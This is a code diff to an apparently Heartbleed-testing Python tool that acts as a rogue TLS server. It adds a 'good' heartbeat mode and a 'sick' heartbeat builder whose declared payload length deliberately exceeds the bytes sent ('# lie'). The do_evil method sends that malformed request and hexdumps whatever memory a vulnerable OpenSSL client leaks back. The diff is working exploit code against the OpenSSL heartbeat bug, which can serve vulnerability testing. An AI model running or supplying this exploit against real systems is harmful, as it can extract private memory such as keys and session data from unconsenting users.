@@ -67,6 +67,9 @@ parser.add_argument('-t', '--timeout', type=int, default=3,
         help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
 parser.add_argument('--skip-server', default=False, action='store_true',
         help='Skip ServerHello, immediately write Heartbeat request')
+parser.add_argument('-g', '--good-request', default=False, action='store_true',
+        dest='good_heart',
+        help='Send a good, well formed Heartbeat request')
 parser.add_argument('-x', '--count', type=int, default=1,
         help='Number of Heartbeats requests to be sent (default %(default)d)')
 parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
@@ -106,6 +109,26 @@ def make_heartbeat(sslver, payload_len=0xffed):
     # heartbeat requests. Therefore request a payload that fits exactly in four
     # records (0x4000 * 4 - 3 - 16 = 0xffed).
     data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
+    return bytearray.fromhex(data.replace('\n', ''))
+
+def make_good_heartbeat(sslver, payload_len=12):
+    payload_len = 12
+    data = '18 ' + sslver
+    data += ' 00 1F'    # Length [3 (type + 2-byte length) + 12 (payload) + 16 (padding)]
+    data += ' 01'       # Type: Request
+    data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
+    data += ' 62 61 6E 61 6E 61 76 65 67 67 69 65' # payload
+    data += ' 78 70 61 64 64 69 6E 67 70 61 64 64 69 6E 67 78' # pad
+    return bytearray.fromhex(data.replace('\n', ''))
+
+def make_sick_heartbeat(sslver, payload_len=12):
+    payload_len = 12*2 # lie
+    data = '18 ' + sslver
+    data += ' 00 1F'    # Length [3 (type + 2-byte length) + 12 (payload) + 16 (padding)]
+    data += ' 01'       # Type: Request
+    data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
+    data += ' 62 61 6E 61 6E 61 76 65 67 67 69 65' # payload
+    data += ' 78 70 61 64 64 69 6E 67 70 61 64 64 69 6E 67 78' #pad
     return bytearray.fromhex(data.replace('\n', ''))
 
 def hexdump(data):
@@ -269,8 +292,12 @@ class RequestHandler(socketserver.BaseRequestHandler):
 
             for i in range(0, self.args.count):
                 try:
-                    if not self.do_evil():
-                        break
+                    if self.args.good_heart:
+                        if not self.do_good():
+                            break
+                    else:
+                        if not self.do_evil():
+                            break
                 except socket.error as e:
                     if i == 0: # First heartbeat?
                         print('Unable to send first heartbeat! ' + str(e))
@@ -322,7 +349,27 @@ class RequestHandler(socketserver.BaseRequestHandler):
     def do_evil(self):
         '''Returns True if memory *may* be acquired'''
         # (2) HeartbeatRequest
-        self.request.sendall(make_heartbeat(self.sslver, self.args.payload_len))
+        self.request.sendall(make_sick_heartbeat(self.sslver, self.args.payload_len))
+
+        # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
+        memory = read_hb_response(self.request, self.args.timeout)
+
+        # If memory is None, then it is not vulnerable for sure. Otherwise, if
+        # empty, then it *may* be invulnerable
+        if memory is not None and not memory:
+            print("Possibly not vulnerable")
+            return False
+        elif memory:
+            print('Client returned {0} ({0:#x}) bytes'.format(len(memory)))
+            hexdump(memory)
+
+        return True
+
+    def do_good(self):
+        '''Returns True if memory *may* be acquired'''
+        print("> Sending good heartbeat request...")
+        # (2) HeartbeatRequest
+        self.request.sendall(make_good_heartbeat(self.sslver, self.args.payload_len))
 
         # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
         memory = read_hb_response(self.request, self.args.timeout)
